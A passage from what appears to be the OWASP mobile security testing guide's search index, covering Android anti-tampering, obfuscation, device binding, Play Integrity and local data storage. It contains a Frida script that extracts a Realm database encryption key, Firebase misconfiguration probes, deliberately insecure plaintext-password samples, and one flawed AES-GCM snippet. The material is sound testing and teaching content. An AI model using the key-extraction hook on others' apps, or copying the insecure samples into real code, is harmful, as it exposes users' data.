emulator\nTelephonyManager.getSimCountryIso()                     us                      possibly emulator\nTelephonyManager.getSimSerial Number()                  89014103211118510720    emulator\nTelephonyManager.getSubscriberId()                      310260000000000         emulator\nTelephonyManager.getVoiceMailNumber()                   15552175049             emulator\n</code></pre> <p>Keep in mind that a hooking framework, such as Xposed or Frida, can hook this API to provide false data.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0032/","title":"MASTG-KNOW-0032: Runtime Integrity Verification","text":"<p>Controls in this category verify the integrity of the app's memory space to defend the app against memory patches applied during runtime. Such patches include unwanted changes to binary code, bytecode, function pointer tables, and important data structures, as well as rogue code loaded into process memory. Integrity can be verified by:</p> <ol> <li>comparing the contents of memory or a checksum over the contents to good values,</li> <li>searching memory for the signatures of unwanted modifications.</li> </ol> <p>There's some overlap with the category \"detecting reverse engineering tools and frameworks\", and, in fact, we demonstrated the signature-based approach in that chapter when we showed how to search process memory for Frida-related strings. Below are a few more examples of various kinds of integrity monitoring.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0032/#detecting-tampering-with-the-java-runtime","title":"Detecting Tampering with the Java Runtime","text":"<p>Hooking frameworks such as  Xposed will inject themselves into the Android Runtime and leave different traces while doing so. These traces can be detected, as shown by this code snippet from the XPosedDetector project.</p> <pre><code>static jclass findXposedBridge(C_JNIEnv *env, jobject classLoader) {\n    return findLoadedClass(env, classLoader, \"de/robv/android/xposed/XposedBridge\"_iobfs.c_str());\n}\nvoid doAntiXposed(C_JNIEnv *env, jobject object, intptr_t hash) {\n    if (!add(hash)) {\n        debug(env, \"checked classLoader %s\", object);\n        return;\n    }\n#ifdef DEBUG\n    LOGI(\"doAntiXposed, classLoader: %p, hash: %zx\", object, hash);\n#endif\n    jclass classXposedBridge = findXposedBridge(env, object);\n    if (classXposedBridge == nullptr) {\n        return;\n    }\n    if (xposed_status == NO_XPOSED) {\n        xposed_status = FOUND_XPOSED;\n    }\n    disableXposedBridge(env, classXposedBridge);\n    if (clearHooks(env, object)) {\n#ifdef DEBUG\n        LOGI(\"hooks cleared\");\n#endif\n        if (xposed_status &lt; ANTIED_XPOSED) {\n            xposed_status = ANTIED_XPOSED;\n        }\n    }\n}\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0032/#detecting-native-hooks","title":"Detecting Native Hooks","text":"<p>By using ELF binaries, native function hooks can be installed by overwriting function pointers in memory (e.g., Global Offset Table or PLT hooking) or patching parts of the function code itself (inline hooking). Checking the integrity of the respective memory regions is one way to detect this kind of hook.</p> <p>The Global Offset Table (GOT) is used to resolve library functions. During runtime, the dynamic linker patches this table with the absolute addresses of global symbols. GOT hooks overwrite the stored function addresses and redirect legitimate function calls to adversary-controlled code. This type of hook can be detected by enumerating the process memory map and verifying that each GOT entry points to a legitimately loaded library.</p> <p>In contrast to GNU <code>ld</code>, which resolves symbol addresses only after they are needed for the first time (lazy binding), the Android linker resolves all external functions and writes the respective GOT entries immediately after a library is loaded (immediate binding). You can therefore expect all GOT entries to point to valid memory locations in the code sections of their respective libraries during runtime. GOT hook detection methods usually walk the GOT and verify this.</p> <p>Inline hooks work by overwriting a few instructions at the beginning or end of the function code. During runtime, this so-called trampoline redirects execution to the injected code. You can detect inline hooks by inspecting the prologues and epilogues of library functions for suspect instructions, such as far jumps to locations outside the library.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0033/","title":"MASTG-KNOW-0033: Obfuscation","text":"<p>The chapter \"Mobile App Tampering and Reverse Engineering\" introduces several well-known obfuscation techniques that can be used in mobile apps in general.</p> <p>Android apps can implement some of those obfuscation techniques using different tooling. For example,  Proguard offers an easy way to shrink and obfuscate code and to strip unneeded debugging information from the bytecode of Android Java apps. It replaces identifiers, such as class names, method names, and variable names, with meaningless character strings. This is a type of layout obfuscation, which doesn't impact the program's performance.</p> <p>Decompiling Java classes is trivial, therefore it is recommended to always applying some basic obfuscation to the production bytecode.</p> <p>Learn more about Android obfuscation techniques:</p> <ul> <li>\"Security Hardening of Android Native Code\" by Gautam Arvind</li> <li>\"APKiD: Fast Identification of AppShielding Products\" by Eduardo Novella ( APKiD)</li> <li>\"Challenges of Native Android Applications: Obfuscation and Vulnerabilities\" by Pierre Graux</li> </ul>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0033/#using-proguard","title":"Using ProGuard","text":"<p>Developers use the build.gradle file to enable obfuscation. In the example below, you can see that <code>minifyEnabled</code> and <code>proguardFiles</code> are set. Creating exceptions to protect some classes from obfuscation (with <code>-keepclassmembers</code> and <code>-keep class</code>) is common. Therefore, auditing the ProGuard configuration file to see what classes are exempted is important. The <code>getDefaultProguardFile('proguard-android.txt')</code> method gets the default ProGuard settings from the <code>&lt;Android SDK&gt;/tools/proguard/</code> folder.</p> <p>Further information on how to shrink, obfuscate, and optimize your app can be found in the Android developer documentation.</p> <p>When you build your project using Android Studio 3.4 or Android Gradle plugin 3.4.0 or higher, the plugin no longer uses ProGuard to perform compile-time code optimization. Instead, the plugin uses the R8 compiler. R8 works with all of your existing ProGuard rules files, so updating the Android Gradle plugin to use R8 should not require you to change your existing rules.</p> <p>R8 is the new code shrinker from Google and was introduced in Android Studio 3.3 beta. By default, R8 removes attributes that are useful for debugging, including line numbers, source file names, and variable names. R8 is a free Java class file shrinker, optimizer, obfuscator, and pre-verifier and is faster than ProGuard, see also an Android Developer blog post for further details. It is shipped with Android's SDK tools. To activate shrinking for the release build, add the following to build.gradle:</p> <pre><code>android {\n    buildTypes {\n        release {\n            // Enables code shrinking, obfuscation, and optimization for only\n            // your project's release build type.\n            minifyEnabled true\n\n            // Includes the default ProGuard rules files that are packaged with\n            // the Android Gradle plugin. To learn more, go to the section about\n            // R8 configuration files.\n            proguardFiles getDefaultProguardFile(\n                    'proguard-android-optimize.txt'),\n                    'proguard-rules.pro'\n        }\n    }\n    ...\n}\n</code></pre> <p>The file <code>proguard-rules.pro</code> is where you define custom ProGuard rules. With the flag <code>-keep</code> you can keep certain code that is not being removed by R8, which might otherwise produce errors. For example to keep common Android classes, as in our sample configuration <code>proguard-rules.pro</code> file:</p> <pre><code>...\n-keep public class * extends android.app.Activity\n-keep public class * extends android.app.Application\n-keep public class * extends android.app.Service\n...\n</code></pre> <p>You can define this more granularly on specific classes or libraries in your project with the following syntax:</p> <pre><code>-keep public class MyClass\n</code></pre> <p>Obfuscation often carries a cost in runtime performance, therefore it is usually only applied to certain very specific parts of the code, typically those dealing with security and runtime protection.</p>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0034/","title":"MASTG-KNOW-0034: Device Binding","text":"<p>The goal of device binding is to impede an attacker who tries to both copy an app and its state from device A to device B and continue executing the app on device B. After device A has been determined trustworthy, it may have more privileges than device B. These differential privileges should not change when an app is copied from device A to device B.</p> <p>Before we describe the usable identifiers, let's quickly discuss how they can be used for binding. There are three methods that allow device binding:</p> <ul> <li> <p>Augmenting the credentials used for authentication with device identifiers. This make sense if the application needs to re-authenticate itself and/or the user frequently.</p> </li> <li> <p>Encrypting the data stored in the device with the key material which is strongly bound to the device can strengthen the device binding. The Android Keystore offers non-exportable private keys which we can use for this. When a malicious actor would extract such data from a device, it wouldn't be possible to decrypt the data, as the key is not accessible. Implementing this, takes the following steps:</p> <ul> <li>Generate the key pair in the Android Keystore using <code>KeyGenParameterSpec</code> API.</li> </ul> <pre><code>//Source: &lt;https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.html&gt;\nKeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(\n        KeyProperties.KEY_ALGORITHM_RSA, \"AndroidKeyStore\");\nkeyPairGenerator.initialize(\n        new KeyGenParameterSpec.Builder(\n                \"key1\",\n                KeyProperties.PURPOSE_DECRYPT)\n                .setDigests(KeyProperties.DIGEST_SHA256, KeyProperties.DIGEST_SHA512)\n                .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_RSA_OAEP)\n                .build());\nKeyPair keyPair = keyPairGenerator.generateKeyPair();\nCipher cipher = Cipher.getInstance(\"RSA/ECB/OAEPWithSHA-256AndMGF1Padding\");\ncipher.init(Cipher.DECRYPT_MODE, keyPair.getPrivate());\n...\n\n// The key pair can also be obtained from the Android Keystore any time as follows:\nKeyStore keyStore = KeyStore.getInstance(\"AndroidKeyStore\");\nkeyStore.load(null);\nPrivateKey privateKey = (PrivateKey) keyStore.getKey(\"key1\", null);\nPublicKey publicKey = keyStore.getCertificate(\"key1\").getPublicKey();\n</code></pre> <ul> <li>Generating a secret key for AES-GCM:</li> </ul> <pre><code>//Source: &lt;https://developer.android.com/reference/android/security/keystore/KeyGenParameterSpec.html&gt;\nKeyGenerator keyGenerator = KeyGenerator.getInstance(\n        KeyProperties.KEY_ALGORITHM_AES, \"AndroidKeyStore\");\nkeyGenerator.init(\n        new KeyGenParameterSpec.Builder(\"key2\",\n                KeyProperties.PURPOSE_ENCRYPT | KeyProperties.PURPOSE_DECRYPT)\n                .setBlockModes(KeyProperties.BLOCK_MODE_GCM)\n                .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)\n                .build());\nSecretKey key = keyGenerator.generateKey();\n\n// The key can also be obtained from the Android Keystore any time as follows:\nKeyStore keyStore = KeyStore.getInstance(\"AndroidKeyStore\");\nkeyStore.load(null);\nkey = (SecretKey) keyStore.getKey(\"key2\", null);\n</code></pre> <ul> <li>Encrypt the authentication data and other sensitive data stored by the application using a secret key through AES-GCM cipher and use device specific parameters such as Instance ID, etc. as associated data:</li> </ul> <pre><code>Cipher cipher = Cipher.getInstance(\"AES/GCM/NoPadding\");\nfinal byte[] nonce = new byte[GCM_NONCE_LENGTH];\nrandom.nextBytes(nonce);\nGCMParameterSpec spec = new GCMParameterSpec(GCM_TAG_LENGTH * 8, nonce);\ncipher.init(Cipher.ENCRYPT_MODE, key, spec);\nbyte[] aad = \"&lt;deviceidentifierhere&gt;\".getBytes();;\ncipher.updateAAD(aad);\ncipher.init(Cipher.ENCRYPT_MODE, key);\n\n//use the cipher to encrypt the authentication data see 0x50e for more details.\n</code></pre> <ul> <li>Encrypt the secret key using the public key stored in Android Keystore and store the encrypted secret key in the private storage of the application.</li> <li>Whenever authentication data such as access tokens or other sensitive data is required, decrypt the secret key using private key stored in Android Keystore and then use the decrypted secret key to decrypt the ciphertext.</li> </ul> </li> <li> <p>Use token-based device authentication (Instance ID) to make sure that the same instance of the app is used.</p> </li> </ul>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-RESILIENCE/MASTG-KNOW-0035/","title":"MASTG-KNOW-0035: Google Play Integrity API","text":"<p>Google has launched the Google Play Integrity API to improve the security and integrity of apps and games on Android starting with Android 4.4 (level 19). The previous official API, SafetyNet, did not cover all the security needs that Google wanted for the platform, so Play Integrity was developed with the basic functions of the previous API and integrated additional features. This change aims to protect users from dangerous and fraudulent interactions.</p> <p>Google Play Integrity offers the following safeguards:</p> <ul> <li>Verification of genuine Android device: It verifies that the application is running on a legitimate Android device.</li> <li>User license validation: It indicates whether the application or game was installed or purchased through the Google Play Store.</li> <li>Unmodified binary verification: It determines whether the application is interacting with the original binary recognized by Google Play.</li> </ul> <p>The API provides four macro categories of information to help the security team make a decision. These categories include:</p> <ol> <li> <p>Request Details: In this section, details are obtained about the app package that requested the integrity check, including its format (e.g., com.example.myapp), a base64-encoded ID provided by the developer to link the request with the integrity certificate, and the execution time of the request in milliseconds.</p> </li> <li> <p>App Integrity: This section provides information about the integrity of the app, including the result of the verification (denominated verdict), which indicates whether the app's installation source is trusted (via Play Store) or unknown/suspicious. If the installation source is considered secure, the app version will also be displayed.</p> </li> <li> <p>Account Details: This category provides information about the app licensing status. The result can be <code>LICENSED</code>, indicating that the user purchased or installed the app on the Google Play Store; <code>UNLICENSED</code>, meaning that the user does not own the app or did not acquire it through the Google Play Store; or <code>UNEVALUATED</code>, which means that the licensing details could not be evaluated because a necessary requirement is missing, that is, the device may not be trustworthy enough or the installed app version is not recognized by the Google Play Store.</p> </li> <li> <p>Device Integrity: This section presents information that verifies the authenticity of the Android environment in which the app is running.</p> </li> <li> <p><code>MEETS_DEVICE_INTEGRITY</code>: The app is on an Android device with Google Play Services, passing system integrity checks and compatibility requirements.</p> </li> <li><code>MEETS_BASIC_INTEGRITY</code>: The app is on a device that may not be approved to run Google Play Services but passes basic integrity checks, possibly due to an unrecognized Android version, unlocked bootloader, or lack of manufacturer certification.</li> <li><code>MEETS_STRONG_INTEGRITY</code>: The app is on a device with Google Play Services, ensuring robust system integrity with features like hardware-protected boot.</li> <li><code>MEETS_VIRTUAL_INTEGRITY</code>: The app runs in an emulator with Google Play Services, passing system integrity checks and meeting Android compatibility requirements.</li> </ol> <p>API Errors:</p> <p>The API can return local errors such as <code>APP_NOT_INSTALLED</code> and <code>APP_UID_MISMATCH</code>, which can indicate a fraud attempt or attack. In addition, outdated Google Play Services or Play Store can also cause errors, and it is important to check these situations to ensure proper integrity verification functionality and to ensure the environment is not intentionally set up for an attack. You can find more details on the official page.</p> <p>Best practices:</p> <ol> <li>Use Play Integrity as part of a broader security strategy. Complement it with additional security measures such as input data validation, user authentication, and anti-fraud protection.</li> <li> <p>Minimize queries to the Play Protect API to reduce device resource impact. For example, employ the API only for essential device integrity verifications.</p> </li> <li> <p>Include a <code>NONCE</code> with integrity verification requests. This random value, generated by the app or server, helps the verification server confirm that responses match the original requests without third-party tampering.</p> </li> </ol> <p>Limitations: The default daily limit for Google Play Services Integrity Verification API requests is 10,000 requests per day. Applications needing more must contact Google to request an increased limit.</p> <p>Example Request:</p> <pre><code>{\n   \"requestDetails\": {\n     \"requestPackageName\": \"com.example.your.package\",\n     \"timestampMillis\": \"1666025823025\",\n     \"nonce\": \"kx7QEkGebwQfBalJ4...Xwjhak7o3uHDDQTTqI\"\n   },\n   \"appIntegrity\": {\n     \"appRecognitionVerdict\": \"UNRECOGNIZED_VERSION\",\n     \"packageName\": \"com.example.your.package\",\n     \"certificateSha256Digest\": [\n       \"vNsB0...ww1U\"\n     ],\n     \"versionCode\": \"1\"\n   },\n   \"deviceIntegrity\": {\n     \"deviceRecognitionVerdict\": [\n       \"MEETS_DEVICE_INTEGRITY\"\n     ]\n   },\n   \"accountDetails\": {\n     \"appLicensingVerdict\": \"UNEVALUATED\"\n   }\n }\n</code></pre>","tags":["android","MASVS-RESILIENCE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0036/","title":"MASTG-KNOW-0036: Shared Preferences","text":"<p>The <code>SharedPreferences</code> API is commonly used to permanently save small collections of key-value pairs.</p> <p>Since Android 4.2 (API level 17) the <code>SharedPreferences</code> object can only be declared to be private (and not world-readable, i.e. accessible to all apps). However, since data stored in a <code>SharedPreferences</code> object is written to a plain-text XML file so its misuse can often lead to exposure of sensitive data.</p> <p>Consider the following example:</p> <pre><code>var sharedPref = getSharedPreferences(\"key\", Context.MODE_PRIVATE)\nvar editor = sharedPref.edit()\neditor.putString(\"username\", \"administrator\")\neditor.putString(\"password\", \"supersecret\")\neditor.commit()\n</code></pre> <p>Once the activity has been called, the file key.xml will be created with the provided data. This code violates several best practices.</p> <ul> <li>The username and password are stored in clear text in <code>/data/data/&lt;package-name&gt;/shared_prefs/key.xml</code>.</li> </ul> <pre><code>&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\n&lt;map&gt;\n  &lt;string name=\"username\"&gt;administrator&lt;/string&gt;\n  &lt;string name=\"password\"&gt;supersecret&lt;/string&gt;\n&lt;/map&gt;\n</code></pre> <p><code>MODE_PRIVATE</code> makes the file only accessible by the calling app. See \"Use SharedPreferences in private mode\".</p> <p>Other insecure modes exist, such as <code>MODE_WORLD_READABLE</code> and <code>MODE_WORLD_WRITEABLE</code>, but they have been deprecated since Android 4.2 (API level 17) and removed in Android 7.0 (API Level 24). Therefore, only apps running on an older OS version (<code>android:minSdkVersion</code> less than 17) will be affected. Otherwise, Android will throw a SecurityException. If an app needs to share private files with other apps, it is best to use a FileProvider with the FLAG_GRANT_READ_URI_PERMISSION. See Sharing Files for more details.</p> <p>You might also use <code>EncryptedSharedPreferences</code>, which is wrapper of <code>SharedPreferences</code> that automatically encrypts all data stored to the shared preferences.</p> <p>Warning</p> <p>The Jetpack security crypto library, including the <code>EncryptedFile</code> and  <code>EncryptedSharedPreferences</code> classes, has been deprecated. However, since an official replacement has not yet been released, we recommend using these classes until one is available.</p> <pre><code>var masterKey: MasterKey? = null\nmasterKey = Builder(this)\n    .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)\n    .build()\n\nval sharedPreferences: SharedPreferences = EncryptedSharedPreferences.create(\n    this,\n    \"secret_shared_prefs\",\n    masterKey,\n    EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,\n    EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM\n)\n\nval editor = sharedPreferences.edit()\neditor.putString(\"username\", \"administrator\")\neditor.putString(\"password\", \"supersecret\")\neditor.commit()\n</code></pre>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0037/","title":"MASTG-KNOW-0037: SQLite Database","text":"<p>SQLite is an SQL database engine that stores data in <code>.db</code> files. The Android SDK has built-in support for SQLite databases. The main package used to manage the databases is <code>android.database.sqlite</code>.</p> <p>For example, you may use the following code to store sensitive information within an activity:</p> <pre><code>var notSoSecure = openOrCreateDatabase(\"privateNotSoSecure\", Context.MODE_PRIVATE, null)\nnotSoSecure.execSQL(\"CREATE TABLE IF NOT EXISTS Accounts(Username VARCHAR, Password VARCHAR);\")\nnotSoSecure.execSQL(\"INSERT INTO Accounts VALUES('admin','AdminPass');\")\nnotSoSecure.close()\n</code></pre> <p>Once the activity has been called, the database file <code>privateNotSoSecure</code> will be created with the provided data and stored in the clear text file <code>/data/data/&lt;package-name&gt;/databases/privateNotSoSecure</code>.</p> <p>The database's directory may contain several files besides the SQLite database:</p> <ul> <li>Journal files: These are temporary files used to implement atomic commit and rollback.</li> <li>Lock files: The lock files are part of the locking and journaling feature, which was designed to improve SQLite concurrency and reduce the writer starvation problem.</li> </ul> <p>Sensitive information should not be stored in unencrypted SQLite databases.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0038/","title":"MASTG-KNOW-0038: SQLCipher Database","text":"<p>With the library SQLCipher, you can password-encrypt SQLite databases.</p> <pre><code>var secureDB = SQLiteDatabase.openOrCreateDatabase(database, \"password123\", null)\nsecureDB.execSQL(\"CREATE TABLE IF NOT EXISTS Accounts(Username VARCHAR,Password VARCHAR);\")\nsecureDB.execSQL(\"INSERT INTO Accounts VALUES('admin','AdminPassEnc');\")\nsecureDB.close()\n</code></pre> <p>Secure ways to retrieve the database key include:</p> <ul> <li>Asking the user to decrypt the database with a PIN or password once the app is opened (weak passwords and PINs are vulnerable to brute force attacks)</li> <li>Storing the key on the server and allowing it to be accessed from a web service only (so that the app can be used only when the device is online)</li> </ul>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0039/","title":"MASTG-KNOW-0039: Firebase Real-time Databases","text":"<p>Firebase is a development platform with more than 15 products, and one of them is Firebase Real-time Database. It can be leveraged by application developers to store and sync data with a NoSQL cloud-hosted database. The data is stored as JSON and is synchronized in real-time to every connected client and also remains available even when the application goes offline.</p> <p>A misconfigured Firebase instance can be identified by making the following network call:</p> <p><code>https://_firebaseProjectName_.firebaseio.com/.json</code></p> <p>The firebaseProjectName can be retrieved from the mobile application by reverse engineering the application. Alternatively, the analysts can use Firebase Scanner, a python script that automates the task above as shown below:</p> <pre><code>python FirebaseScanner.py -p &lt;pathOfAPKFile&gt;\n\npython FirebaseScanner.py -f &lt;commaSeparatedFirebaseProjectNames&gt;\n</code></pre>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0040/","title":"MASTG-KNOW-0040: Realm Databases","text":"<p>The Realm Database for Java is becoming more and more popular among developers. The database and its contents can be encrypted with a key stored in the configuration file.</p> <pre><code>//the getKey() method either gets the key from the server or from a KeyStore, or is derived from a password.\nRealmConfiguration config = new RealmConfiguration.Builder()\n  .encryptionKey(getKey())\n  .build();\n\nRealm realm = Realm.getInstance(config);\n</code></pre> <p>Access to the data depends on the encryption: unencrypted databases are easily accessible, while encrypted ones require investigation into how the key is managed - whether it's hardcoded or stored unencrypted in an insecure location such as shared preferences, or securely in the platform's KeyStore (which is best practice).</p> <p>However, if an attacker has sufficient access to the device (e.g. root access) or can repackage the app, they can still retrieve encryption keys at runtime using tools like Frida. The following Frida script demonstrates how to intercept the Realm encryption key and access the contents of the encrypted database.</p> <pre><code>'use strict';\n\nfunction modulus(x, n){\n    return ((x % n) + n) % n;\n}\n\nfunction bytesToHex(bytes) {\n    for (var hex = [], i = 0; i &lt; bytes.length; i++) { hex.push(((bytes[i] &gt;&gt;&gt; 4) &amp; 0xF).toString(16).toUpperCase());\n        hex.push((bytes[i] &amp; 0xF).toString(16).toUpperCase());\n    }\n    return hex.join(\"\");\n}\n\nfunction b2s(array) {\n    var result = \"\";\n    for (var i = 0; i &lt; array.length; i++) {\n        result += String.fromCharCode(modulus(array[i], 256));\n    }\n    return result;\n}\n\n// Main Modulus and function.\n\nif(Java.available){\n    console.log(\"Java is available\");\n    console.log(\"[+] Android Device.. Hooking Realm Configuration.\");\n\n    Java.perform(function(){\n        var RealmConfiguration = Java.use('io.realm.RealmConfiguration');\n        if(RealmConfiguration){\n            console.log(\"[++] Realm Configuration is available\");\n            Java.choose(\"io.realm.Realm\", {\n                onMatch: function(instance)\n                {\n                    console.log(\"[==] Opened Realm Database...Obtaining the key...\")\n                    console.log(instance);\n                    console.log(instance.getPath());\n                    console.log(instance.getVersion());\n                    var encryption_key = instance.getConfiguration().getEncryptionKey();\n                    console.log(encryption_key);\n                    console.log(\"Length of the key: \" + encryption_key.length); \n                    console.log(\"Decryption Key:\", bytesToHex(encryption_key));\n\n                }, \n                onComplete: function(instance){\n                    RealmConfiguration.$init.overload('java.io.File', 'java.lang.String', '[B', 'long', 'io.realm.RealmMigration', 'boolean', 'io.realm.internal.OsRealmConfig$Durability', 'io.realm.internal.RealmProxyMediator', 'io.realm.rx.RxObservableFactory', 'io.realm.coroutines.FlowFactory', 'io.realm.Realm$Transaction', 'boolean', 'io.realm.CompactOnLaunchCallback', 'boolean', 'long', 'boolean', 'boolean').implementation = function(arg1)\n                    {\n                        console.log(\"[==] Realm onComplete Finished..\")\n\n                    }\n                }\n\n            });\n        }\n    });\n}\n</code></pre>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0041/","title":"MASTG-KNOW-0041: Internal Storage","text":"<p>You can save files to the device's internal storage. Files saved to internal storage are containerized by default and cannot be accessed by other apps on the device. When the user uninstalls your app, these files are removed.</p> <p>For example, the following Kotlin snippet stores sensitive information in clear text to a file <code>sensitive_info.txt</code> residing on internal storage.</p> <pre><code>val fileName = \"sensitive_info.txt\"\nval fileContents = \"This is some top-secret information!\"\nFile(filesDir, fileName).bufferedWriter().use { writer -&gt;\n    writer.write(fileContents)\n}\n</code></pre> <p>You should check the file mode to make sure that only the app can access the file. You can set this access with <code>MODE_PRIVATE</code>. Modes such as <code>MODE_WORLD_READABLE</code> (deprecated) and <code>MODE_WORLD_WRITEABLE</code> (deprecated) may pose a security risk.</p> <p>Android Security Guidelines: Android highlights that the data in the internal storage is private to the app and other apps cannot access it. It also recommends avoiding the use of <code>MODE_WORLD_READABLE</code> and <code>MODE_WORLD_WRITEABLE</code> modes for IPC files and use a content provider instead. See the Android Security Guidelines. Android also provides a guide on how to use internal storage securely.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0042/","title":"MASTG-KNOW-0042: External Storage","text":"<p>Android devices support shared external storage. This storage may be removable (such as an SD card) or emulated (non-removable). A malicious app with proper permissions running on Android 10 or below can access data that you write to \"external\" app-specific-directories. The user can also modify these files when USB mass storage is enabled.</p> <p>The files stored in these directories are removed when your app is uninstalled.</p> <p>External storage must be used carefully as there are many risks associated with it. For example an attacker may be able to retrieve sensitive data or obtain arbitrary control of the application.</p> <p>Android Security Guidelines: Android recommends not storing sensitive data on external storage and to perform input validation on all data stored on external storage. See the Android Security Guidelines. Android also provides a guide on how to use external storage securely.</p>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0042/#scoped-storage","title":"Scoped Storage","text":"<p>To give users more control over their files and to limit file clutter, apps that target Android 10 (API level 29) and higher are given scoped access into external storage, or scoped storage, by default. When scoped storage is enabled, apps cannot access the app-specific directories that belong to other apps.</p> <p>The Android developers documentation provides a detailed guide highlighting common storage use cases and best practices differentiating between handling media and non-media files and considering scoped storage.</p> <p>Opting out: Apps targeting Android 10 (API level 29) or lower can temporarily opt out of scoped storage using <code>android:requestLegacyExternalStorage=\"true\"</code> in their app manifest. Once the app targets Android 11 (API level 30), the system ignores the <code>requestLegacyExternalStorage</code> attribute when running on Android 11 devices.</p> <p>App attribution for media files (Android Developers): When scoped storage is enabled for an app that targets Android 10 or higher, the system attributes an app to each media file, which determines the files that your app can access when it hasn't requested any storage permissions. Each file can be attributed to only one app. Therefore, if your app creates a media file that's stored in the photos, videos, or audio files media collection, your app has access to the file.</p> <p>If the user uninstalls and reinstalls your app, however, you must request READ_EXTERNAL_STORAGE to access the files that your app originally created. This permission request is required because the system considers the file to be attributed to the previously installed version of the app, rather than the newly installed one.</p> <p>For example, trying to access a file stored using the <code>MediaStore</code> API with a <code>content://</code> URI like <code>content://media/external_primary</code> would only work as long as the image belongs to the invoking app (due to <code>owner_package_name</code> attribute in the <code>MediaStore</code>). If the app calls a <code>content://</code> URI that does not belong to the app, it will fail with a <code>SecurityException</code>:</p> <pre><code>Cannot open content uri: content://media/external_primary/images/media/1000000041\njava.lang.SecurityException: org.owasp.mastestapp has no access to content://media/external_primary/images/media/1000000041\n</code></pre> <p>You can validate this by querying the MediaStore via adb, for example:</p> <ul> <li><code>adb shell content query --uri content://media/external_primary/images/media</code></li> <li><code>adb shell content query --uri content://media/external_primary/file</code></li> </ul> <p>To be able to access the content, the app must have the necessary permissions e.g., <code>READ_EXTERNAL_STORAGE</code> before Android 10 API level 29, <code>READ_MEDIA_IMAGES</code> or <code>MANAGE_EXTERNAL_STORAGE</code> from Android 10 API level 29 onwards.</p> <p><code>READ_EXTERNAL_STORAGE</code> is deprecated (and is not granted) when targeting Android 13 (API level 33) and above. If you need to query or interact with MediaStore or media files on the shared storage, you should instead use one or more new storage permissions: <code>READ_MEDIA_IMAGES</code>, <code>READ_MEDIA_VIDEO</code> or <code>READ_MEDIA_AUDIO</code>.</p> <p>Scoped storage is enforced starting on Android 10 (API level 29) (or Android 11 if using <code>requestLegacyExternalStorage</code>). In particular, <code>WRITE_EXTERNAL_STORAGE</code> will no longer provide write access to all files; it will provide the equivalent of <code>READ_EXTERNAL_STORAGE</code> instead.</p> <p>As of Android 13 (API level 33), if you need to query or interact with MediaStore or media files on the shared storage, you should be using instead one or more new storage permissions: <code>READ_MEDIA_IMAGES</code>, <code>READ_MEDIA_VIDEO</code> or <code>READ_MEDIA_AUDIO</code>.</p> <p>After declaring the permission in the manifest you can grant it with adb:</p> <pre><code>adb shell pm grant org.owasp.mastestapp android.permission.READ_MEDIA_IMAGES\n</code></pre> <p>You can revoke the permission with:</p> <pre><code>adb shell pm revoke org.owasp.mastestapp android.permission.READ_MEDIA_IMAGES\n</code></pre>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0042/#external-storage-apis","title":"External Storage APIs","text":"<p>There are APIs such as <code>getExternalStoragePublicDirectory</code> that return paths to a shared location that other apps can access. An app may obtain a path to an \"external\" location and write sensitive data to it. This location is considered \"Shared Storage Requiring No User Interaction\", which means that a third-party app with proper permissions can read this sensitive data.</p> <p>For example, the following Kotlin snippet stores sensitive information in clear text to a file <code>password.txt</code> residing on external storage.</p> <pre><code>val password = \"SecretPassword\"\nval path = context.getExternalFilesDir(null)\nval file = File(path, \"password.txt\")\nfile.appendText(password)\n</code></pre>","tags":["android","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0042/#mediastore-api","title":"MediaStore API","text":"<p>The <code>MediaStore</code> API provides a way for apps to interact with two types of files stored on the device:</p> <ul> <li>media files including images (<code>MediaStore.Images</code>), videos (<code>MediaStore.Video</code>), audio (<code>MediaStore.Audio</code>) and downloads (<code>MediaStore.Downloads</code>), and</li> <li>non-media files (e.g. text, HTML, PDF, etc.) stored in the <code>MediaStore.Files</code> collection.</li> </ul> <p>Using this API requires a <code>ContentResolver</code> object retrieved from the app's Context. See an example in the Android Developers documentation.</p> <p>Apps running on Android 9 (API level 28) or lower:</p> <ul> <li>They can access the app-specific files that belong to other apps if they have opted out of scoped storage and requested the <code>READ_EXTERNAL_STORAGE</code> permission.</li> <li>To modify the files, the app must also request the <code>WRITE_EXTERNAL_STORAGE</code> permission.</li> </ul> <p>Apps running on Android 10 (API level 29) or 